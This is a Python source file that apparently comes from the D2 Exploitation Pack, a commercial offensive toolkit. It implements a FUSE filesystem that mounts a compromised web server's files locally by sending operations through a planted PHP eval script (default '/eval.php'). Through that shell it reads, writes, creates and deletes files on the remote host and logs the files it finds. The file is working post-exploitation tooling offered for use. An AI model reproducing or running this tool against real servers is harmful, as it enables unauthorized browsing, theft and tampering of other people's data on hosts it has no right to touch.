#!/usr/bin/env python
# -*- coding: utf-8 -*-

#
# Proprietary D2 Exploitation Pack source code - use only under the license 
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2014
#


import errno
import fuse
import time
import os
import optparse
import sys

import stat3
import php

VERSION = "0.1"

class D2FS(fuse.Fuse):
    def __init__(self, logfile='/tmp/d2fs_log.txt', *args, **kw):
        fuse.Fuse.__init__(self, *args, **kw)
        self.parser.add_option(
          mountopt="server", metavar="SERVER",  help="Remote serveri [%default]", default="192.168.0.1")
        self.parser.add_option(
          mountopt="uri", metavar="URI",
          help="Server-side script on the remote server used to mount a remote directory [%default]",
          default="/eval.php"),
        self.parse(errex=1)
        opts, args = self.cmdline
        self.logfile = open(logfile, 'a+')
        self.logged = []
        self.cache = {
            'getattr': {},
            }

        self.php = php.Php(opts.server, opts.uri)
        print '[*] Remote filesystem mounted...'
        print 'args: server=%s, uri=%s' % (opts.server, opts.uri)

    def log_entry(self, path, st):
        if os.path.basename(path) in [ '.', '..' ]:
            return
        if self.logfile and not path in self.logged:
            mode = stat3.filemode(st.st_mode)
            mtime = time.strftime('%b %2d %H:%M', time.localtime(st.st_mtime))
            msg = '%s %5d %5d %5s %s' % (mode, st.st_uid, st.st_gid, mtime, path)
            self.logged.append(path)
            self.logfile.write(msg + '\n')
            self.logfile.flush()

    def addslashes(self, s):
        s = s.replace('\\', '\\\\')
        s = s.replace("'", "\\'")
        return s


    def chdir(self):
        if not self.root:
            return
        if self.php.chdir(self.root) != 0:
            print '[-] can\'t chdir to "%s"' % self.root


    def parse_stat(self, l):
        l = [ int(x) for x in l ]
        st = fuse.Stat(st_mode=l[0], st_ino=l[1], st_dev=l[2], st_nlink=l[3],
                       st_uid=l[4], st_gid=l[5], st_size=l[6], st_atime=l[7],
                       st_mtime=l[8], st_ctime=l[9])
        return st


    def getattr(self, path):
        path = self.addslashes(path)
        print '[+] getattr("%s")' % path

        if self.cache['getattr'].has_key(path):
            return self.cache['getattr'].pop(path)

        l = self.php.getattr(path)
        print '=> ', l
        if type(l) == int:
            error = l
            return error

        return self.parse_stat(l)


    def readdir_nocache(self, path, offset):
        path = self.addslashes(path)
        print '[+] readdir("%s", %d)' % (path, offset)
        l = self.php.readdir_nocache(path)
        if type(l) == list:
            return [ fuse.Direntry(e) for e in l ]
        else:
            return l


    def readdir(self, path, offset):
        path = self.addslashes(path)
        print '[+] readdir("%s", %d)' % (path, offset)
        entries, stats = self.php.readdir(path)

        # check if an error occured
        if type(entries) != list:
            error = entries
            return error

        # if not, cache getattr results()
        assert len(entries) == len(stats)
        for i in range(0, len(entries)):
            entry = entries[i]
            # XXX: directory separator windows
            entry = os.path.join(path, entry)
            # parse stat if not an error
            if type(stats[i]) == list:
                st = self.parse_stat(stats[i])
                self.log_entry(entry, st)
            else:
                st = stats[i]
            self.cache['getattr'][entry] = st

        return [ fuse.Direntry(e) for e in entries ]


    def mkdir(self, path, mode):
        path = self.addslashes(path)
        print '*** mkdir', path, oct(mode)
        return self.php.mkdir(path, mode)


    def mknod(self, path, mode, dev):
        path = self.addslashes(path)
        print '*** mknod', path, oct(mode), dev
        error = self.php.mknod(path, mode, dev)
        print '?', error
        return error


    def open(self, path, flags):
        mode = 'r'
        return self.php.open(path, mode)


    def read(self, path, length, offset):
        path = self.addslashes(path)
        print '*** read', path, length, offset
        return self.php.read(path, length, offset)


    def unlink(self, path):
        path = self.addslashes(path)
        print '*** unlink', path
        return self.php.unlink(path)


    def write(self, path, buf, offset):
        path = self.addslashes(path)
        print '*** write', path, buf, offset
        written = self.php.write(path, buf, offset)
        print '[+] written = %d' % written
        return written


    def truncate(self, path, size):
        path = self.addslashes(path)
        print '*** truncate', path, size
        return self.php.truncate(path, size)


    def rmdir(self, path):
        path = self.addslashes(path)
        print '*** rmdir', path
        return self.php.rmdir(path)


    def getdir(self, path):
        print '*** getdir', path
        return -errno.ENOSYS

    def mythread ( self ):
        print '*** mythread'
        return -errno.ENOSYS

    def chmod ( self, path, mode ):
        print '*** chmod', path, oct(mode)
        return -errno.ENOSYS

    def chown ( self, path, uid, gid ):
        print '*** chown', path, uid, gid
        return -errno.ENOSYS

    def fsync ( self, path, isFsyncFile ):
        print '*** fsync', path, isFsyncFile
        return -errno.ENOSYS

    def link ( self, targetPath, linkPath ):
        print '*** link', targetPath, linkPath
        return -errno.ENOSYS

    def readlink ( self, path ):
        print '*** readlink', path
        return -errno.ENOSYS

    def release ( self, path, flags ):
        print '*** release', path, flags
        return -errno.ENOSYS

    def rename ( self, oldPath, newPath ):
        print '*** rename', oldPath, newPath
        return -errno.ENOSYS

    def statfs ( self ):
        print '*** statfs'
        return -errno.ENOSYS

    def symlink ( self, targetPath, linkPath ):
        print '*** symlink', targetPath, linkPath
        return -errno.ENOSYS

    def utime ( self, path, times ):
        print '*** utime', path, times
        return -errno.ENOSYS


def main():
    fuse.fuse_python_api = (0, 2)
    fs = D2FS()
    fs.flags = 0
    fs.multithreaded = 0
    fs.main()

if __name__ == '__main__':
  main()
